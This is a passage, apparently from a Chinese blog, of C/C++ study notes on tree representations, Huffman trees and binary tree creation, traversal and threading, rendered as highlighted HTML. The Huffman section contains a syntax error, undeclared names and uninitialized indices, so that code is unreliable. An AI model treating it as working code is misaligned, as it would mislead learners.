class="hljs-comment">//用一组连续的存储空间来存储树的结点，同时在每一个结点中附加一个指示器，用以指示双亲结点的位（下标）</span><br><span class="hljs-comment">//容易找到双亲，找孩子需要遍历</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PTNode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-type">int</span> parent;<br>&#125;PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>PTNode nodes[MAX_SIZE];<br><span class="hljs-type">int</span> r;<span class="hljs-comment">//根结点位置</span><br><span class="hljs-type">int</span> n;<span class="hljs-comment">//结点数</span><br>&#125;PTree;<br><br><span class="hljs-comment">//复合链表结构</span><br><span class="hljs-comment">//对于树中的每个结点，其孩子结点排列起来，用单链表存储</span><br><span class="hljs-comment">//n个结点的树有n个孩子链表（叶子结点的孩子链表为空），而n个头指针有组成一个线性表且以顺序存储结构起来</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NODE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CTNOde</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> child;<span class="hljs-comment">//孩子结点编号</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CTNode</span> *<span class="hljs-title">next</span>;</span><br>&#125;*ChildPtr;<span class="hljs-comment">//孩子结点</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> data;<br>ChildPtr firstchild;<span class="hljs-comment">//孩子链表头指针</span><br>&#125;CTBox;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>CTBox node[MAX_NODE];<br><span class="hljs-type">int</span> r;<span class="hljs-comment">//根结点位置</span><br><span class="hljs-type">int</span> n;<span class="hljs-comment">//结点数</span><br>&#125;CTree;<span class="hljs-comment">//头结点结构</span><br><br><br><span class="hljs-comment">//孩子兄弟表示法（二叉树表示法）</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CSnode</span> &#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CSNode</span> *<span class="hljs-title">firstchild</span>, *<span class="hljs-title">nextsibing</span>;</span><br>&#125;CSNode, *CSTree;<br><br></code></pre></td></tr></table></figure><h1>哈夫曼树</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> weight;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> parent, lchild, rchild;<br>&#125;HTNode, *HuffmanTree;<br><br><span class="hljs-comment">//m=2*n-1;</span><br><span class="hljs-comment">//HT=new HTNode[m+1]</span><br><span class="hljs-comment">//零号单元未用</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreatHuffmanTree</span><span class="hljs-params">(HuffmanTree &amp;HT, <span class="hljs-type">int</span> n)</span> &#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>)<span class="hljs-keyword">return</span>;<br><span class="hljs-type">int</span> m = <span class="hljs-number">2</span> * n - <span class="hljs-number">1</span>;<span class="hljs-comment">//0号单元未用，HT[m]表示根结点</span><br>HT = new HTNode[m + <span class="hljs-number">1</span>];<span class="hljs-comment">//(HuffmanTree)malloc(m+1)*sizeof((m+1)*sizeof(HTNode))</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= m; ++i)<br>&#123;<br>HT[i].parent = <span class="hljs-number">0</span>;<br>HT[i].lchild = <span class="hljs-number">0</span>;<br>HT[i].rchild = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n; ++i)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, HT[i].weight);<br><br><span class="hljs-comment">//构造Huffman树</span><br><span class="hljs-keyword">for</span> (i = n + <span class="hljs-number">1</span>; i &lt;= m; ++i)<br>&#123;<br><span class="hljs-type">int</span> s1, s2;<br><span class="hljs-comment">//Select(HT,i-1,s1,s2;</span><br><span class="hljs-comment">//在HT[k](1&lt;=k&lt;=i-1)中选择两个双亲域为0，且权值最小的结点</span><br><span class="hljs-comment">//返回他们在HT中的序号</span><br>HT[s1].parent=i;<br>HT[s2].parent=i;<br><span class="hljs-comment">//更新结点s1和结点s2的双亲</span><br>HT[i].lchild = s1;<br>HT[i].lchild = s1;<br>HT[i].rchild = s2;<br><span class="hljs-comment">//s1、s2分别为左右孩子</span><br>HT[i].weight = HT[s1].weight + HT[s2].weight;<br><span class="hljs-comment">//i的权值为左右孩子权值之和</span><br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">/////</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateHuffmanCode</span><span class="hljs-params">(HuffmanTree HT, HUffmanCode &amp;HC, <span class="hljs-type">int</span> n)</span><br>&#123;<br><span class="hljs-type">int</span> i, c, f,start;<br>HC = new <span class="hljs-type">char</span>*[n + <span class="hljs-number">1</span>];<br>cd = new <span class="hljs-type">char</span>[n];<br>cd[n - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;<br>start = n - <span class="hljs-number">1</span>;<br>c = i;<br>f = HT[i].parent;<br><span class="hljs-keyword">while</span> (f != <span class="hljs-number">0</span>) &#123;<br>--start;<br><span class="hljs-keyword">if</span> (HT[f].lchild == c)cd[start=] = <span class="hljs-string">&#x27;0&#x27;</span>;<br><span class="hljs-keyword">else</span> cd[start] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>c = f;<br>f = HT[f].parent;<br>&#125;<br>HC[i] = new <span class="hljs-type">char</span>[n - start];<br><span class="hljs-built_in">strcpy</span>(HC[i], &amp;cd[start]);<br>&#125;<br>delete cd;<br>&#125;<br></code></pre></td></tr></table></figure><h1>实例1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 二叉树链表的存储结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">char</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125;BiTNode, *BiTree;<br><br><span class="hljs-comment">//二叉树的建立</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreatBiTree</span><span class="hljs-params">(BiTree &amp;T)</span><br>&#123;<br><span class="hljs-type">char</span> ch;<br><span class="hljs-built_in">cin</span> &gt;&gt; ch;<br><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;#&#x27;</span>)<br>T = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br>T = new BiTNode;<br><span class="hljs-keyword">if</span> (!T)<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>T-&gt;data = ch;<br>CreatBiTree(T-&gt;lchild);   <span class="hljs-comment">// 构造左子树</span><br>CreatBiTree(T-&gt;rchild);   <span class="hljs-comment">// 构造右子树</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//前序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; T-&gt;data;<br>PreOrderTraverse(T-&gt;lchild);<br>PreOrderTraverse(T-&gt;rchild);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 中序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraverse</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T)<br>&#123;<br>InOrderTraverse(T-&gt;lchild);<br><span class="hljs-built_in">cout</span> &lt;&lt; T-&gt;data;<br>InOrderTraverse(T-&gt;rchild);<br>&#125;<br>&#125;<br><span class="hljs-comment">//后序遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">PostOrderTraverse</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T)<br>&#123;<br>PostOrderTraverse(T-&gt;lchild);<br>PostOrderTraverse(T-&gt;rchild);<br><span class="hljs-built_in">cout</span> &lt;&lt; T-&gt;data;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>BiTree T;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入建立二叉链表的序列：\n&quot;</span>;<br>CreatBiTree(T);<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;前序排序：&quot;</span>;<br>PreOrderTraverse(T);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;中序排序：&quot;</span>;<br>InOrderTraverse(T);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;后序排序：&quot;</span>;<br>PostOrderTraverse(T);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>实例2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 二叉树的二叉链表存储表示</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">char</span> data;<span class="hljs-comment">// 结点数据域</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><span class="hljs-comment">// 左右孩子指针</span><br>&#125;BiTNode, *BiTree;<br><br><span class="hljs-comment">// 建立二叉链表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBiTree</span><span class="hljs-params">(BiTree &amp;T)</span><br>&#123;<br><span class="hljs-comment">// 按先序次序输入二叉树中结点的值（一个字符），创建二叉链表表示的二叉树T</span><br><span class="hljs-type">char</span> ch;<br><span class="hljs-built_in">cin</span> &gt;&gt; ch;<br><br><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;#&#x27;</span>)<br>T = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">//递归结束，建空树</span><br><span class="hljs-keyword">else</span><br>&#123;<br>T = new BiTNode;<br>T-&gt;data = ch;<span class="hljs-comment">// 生成根结点</span><br>CreateBiTree(T-&gt;lchild); <span class="hljs-comment">// 递归创建左子树</span><br>CreateBiTree(T-&gt;rchild); <span class="hljs-comment">// 递归创建右子树</span><br>&#125;<br>&#125;<span class="hljs-comment">// CreateBiTree</span><br><br><span class="hljs-comment">// 复制二叉树</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Copy</span><span class="hljs-params">(BiTree T, BiTree &amp;NewT)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<br>&#123;       <span class="hljs-comment">// 如果是空树，递归结束</span><br>NewT = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>NewT = new BiTNode;<br>NewT-&gt;data = T-&gt;data;<span class="hljs-comment">// 复制根结点</span><br>Copy(T-&gt;lchild, NewT-&gt;lchild);   <span class="hljs-comment">// 递归复制左子树</span><br>Copy(T-&gt;rchild, NewT-&gt;rchild);  <span class="hljs-comment">// 递归复制右子树</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 计算二叉树深度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Depth</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-type">int</span> m, n;<br><br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <span class="hljs-comment">//如果是空树，深度为0，递归结束</span><br><span class="hljs-keyword">else</span><br>&#123;<br>m = Depth(T-&gt;lchild);  <span class="hljs-comment">// 递归计算左子树的深度记为m</span><br>n = Depth(T-&gt;rchild);  <span class="hljs-comment">// 递归计算右子树的深度记为n</span><br><span class="hljs-keyword">if</span> (m &gt; n)<br><span class="hljs-keyword">return</span> (m + <span class="hljs-number">1</span>);  <span class="hljs-comment">// 二叉树的深度为m与n的较大者加1</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> (n + <span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 统计二叉树节点个数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">NodeCount</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 如果是空树，则结点个数为0，递归结束</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//否则结点个数为左子树的结点个数+右子树的结点个数+1</span><br>&#125;<br><br><span class="hljs-comment">// 中序遍历的递归算法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderTraverse</span><span class="hljs-params">(BiTree T)</span><br>&#123;<br><span class="hljs-keyword">if</span> (T)<br>&#123;<br>InOrderTraverse(T-&gt;lchild);<br><span class="hljs-built_in">cout</span> &lt;&lt; T-&gt;data;<br>InOrderTraverse(T-&gt;rchild);<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>BiTree tree, new_tree;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入建立二叉树的序列: \n&quot;</span>;<br>CreateBiTree(tree);<br>Copy(tree, new_tree);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;复制得到的新树的中序序列: \n&quot;</span>;<br>InOrderTraverse(new_tree);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;二叉树的深度为: &quot;</span> &lt;&lt; Depth(new_tree) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;二叉树的结点个数为: &quot;</span> &lt;&lt; NodeCount(new_tree) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>实例3</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 二叉树的二叉线索类型存储表示</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrNode</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">char</span> data;<span class="hljs-comment">// 结点数据域</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiThrNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><span class="hljs-comment">// 左右孩子指针</span><br><span class="hljs-type">int</span> LTag, RTag;<br>&#125;BiThrNode, *BiThrTree;<br><br><span class="hljs-comment">//全局变量pre</span><br>BiThrNode *pre = new BiThrNode;<br><br><span class="hljs-comment">// 建立二叉链表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">CreateBiTree</span><span class="hljs-params">(BiThrTree &amp;T)</span><br>&#123;<br><span class="hljs-comment">//按先序次序输入二叉树中结点的值（一个字符），创建二叉链表表示的二叉树T</span><br><span class="hljs-type">char</span> ch;<br><span class="hljs-built_in">cin</span> &gt;&gt; ch;<br><br><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;#&#x27;</span>)<br>T = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 递归结束，建空树</span><br><span class="hljs-keyword">else</span><br>&#123;<br>T = new BiThrNode;<br>T-&gt;data = ch;     <span class="hljs-comment">// 生成根结点</span><br>CreateBiTree(T-&gt;lchild); <span class="hljs-comment">// 递归创建左子树</span><br>CreateBiTree(T-&gt;rchild); <span class="hljs-comment">// 递归创建右子树</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 以结点P为根的子树中序线索化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InThreading</span><span class="hljs-params">(BiThrTree p)</span><br>&#123;<br><span class="hljs-comment">// pre是全局变量，初始化时其右孩子指针为空，便于在树的最左点开始建线索</span><br><span class="hljs-keyword">if</span> (p)<br>&#123;<br>InThreading(p-&gt;lchild);   <span class="hljs-comment">// 左子树递归线索化</span><br><span class="hljs-keyword">if</span> (!p-&gt;lchild)<br>&#123;                    <span class="hljs-comment">// p的左孩子为空</span><br>p-&gt;LTag = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 给p加上左线索</span><br>p-&gt;lchild = pre;   <span class="hljs-comment">// p的左孩子指针指向pre（前驱）</span><br>&#125;<br><span class="hljs-keyword">else</span><br>p-&gt;LTag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!pre-&gt;rchild)<br>&#123;   <span class="hljs-comment">// pre的右孩子为空</span><br>pre-&gt;RTag = <span class="hljs-number">1</span>;     <span class="hljs-comment">// 给pre加上右线索</span><br>pre-&gt;rchild = p;  <span class="hljs-comment">// pre的右孩子指针指向p（后继）</span><br>&#125;<br><span class="hljs-keyword">else</span><br>pre-&gt;RTag = <span class="hljs-number">0</span>;<br>pre = p;              <span class="hljs-comment">// 保持pre指向p的前驱</span><br>InThreading(p-&gt;rchild);  <span class="hljs-comment">// 右子树递归线索化</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 带头结点的中序线索化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InOrderThreading</span><span class="hljs-params">(BiThrTree &amp;Thrt, BiThrTree T)</span><br>&#123;<br><span class="hljs-comment">//中序遍历二叉树T，并将其中序线索化，Thrt指向头结点</span><br>Thrt = new BiThrNode;   <span class="hljs-comment">// 建头结点</span><br>Thrt-&gt;LTag = <span class="hljs-number">0</span>;         <span class="hljs-comment">// 头结点有左孩子，若树非空，则其左孩子为树根</span><br>Thrt-&gt;RTag = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 头结点的右孩子指针为右线索</span><br>Thrt-&gt;rchild = Thrt;   <span class="hljs-comment">// 初始化时右指针指向自己</span><br><span class="hljs-keyword">if</span> (!T)<br>Thrt-&gt;lchild = Thrt;   <span class="hljs-comment">// 若树为空，则左指针也指向自己</span><br><span class="hljs-keyword">else</span><br>&#123;<br>Thrt-&gt;lchild = T;  pre = Thrt; <span class="hljs-comment">// 头结点的左孩子指向根，pre初值指向头结点</span><br>InThreading(T);          <span class="hljs-comment">// 对以T为根的二叉树进行中序线索化</span><br>pre-&gt;rchild = Thrt;     <span class="hljs-comment">// pre为最右结点，pre的右线索指向头结点</span><br>pre-&gt;RTag = <span class="hljs-number">1</span>;<br>Thrt-&gt;rchild = pre;   <span class="hljs-comment">// 头结点的右线索指向pre</span><br>&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title 